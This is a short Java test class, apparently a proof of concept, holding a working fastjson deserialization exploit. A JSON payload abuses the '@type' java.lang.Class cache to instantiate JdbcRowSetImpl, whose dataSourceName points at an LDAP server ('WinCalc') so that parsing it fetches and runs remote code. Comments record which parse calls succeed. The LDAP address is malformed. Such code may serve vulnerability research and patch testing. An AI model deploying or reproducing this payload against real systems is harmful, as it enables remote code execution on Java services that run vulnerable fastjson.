package com.wuya.test;

import com.alibaba.fastjson.JSON;

public class TestPoc {
    public static void main(String[] args) {
        String payload = "{\n" +
                "    \"rand1\": {\n" +
                "        \"@type\": \"java.lang.Class\", \n" +
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    }, \n" +
                "    \"rand2\": {\n" +
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \n" +
                "        \"dataSourceName\": \"ldap://192.168/142.132:9473/WinCalc\", \n" +
        "        \"autoCommit\": true\n" +
                "    }\n" +
                "}";
        //JSON.parse(payload); 成功
        //JSON.parseObject(payload); 成功
        //JSON.parseObject(payload,Object.class); 成功
        JSON.parseObject(payload, User.class);
    }
}